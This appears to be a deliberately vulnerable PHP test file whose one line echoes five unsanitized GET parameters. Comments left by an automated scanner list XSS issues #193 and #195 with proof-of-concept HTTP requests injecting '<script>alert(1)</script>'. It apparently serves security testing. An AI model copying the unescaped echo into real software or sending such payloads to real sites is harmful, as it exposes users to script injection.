<?php
//TODO: AI XSS issue #193, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/193, 4bceff05
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-019c548/vulnerable.php?id5=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #193, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/193, 9380f060
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-019c548/vulnerable.php?id4=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #193, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/193, 5dedd30e
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-019c548/vulnerable.php?id3=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #193, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/193, 3a9c1597
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-019c548/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #193, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/193, b4caf0e1
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-019c548/vulnerable.php?id1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 42a6e44e
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id5=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 7177b07a
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id4=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, 838a8cdb
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id3=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
//TODO: AI XSS issue #195, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/195, f282cb8c
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-fd762bb/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
echo $_GET['id1']." ".$_GET['id2']." ".$_GET['id3']." ".$_GET['id4']." ".$_GET['id5'];
?>
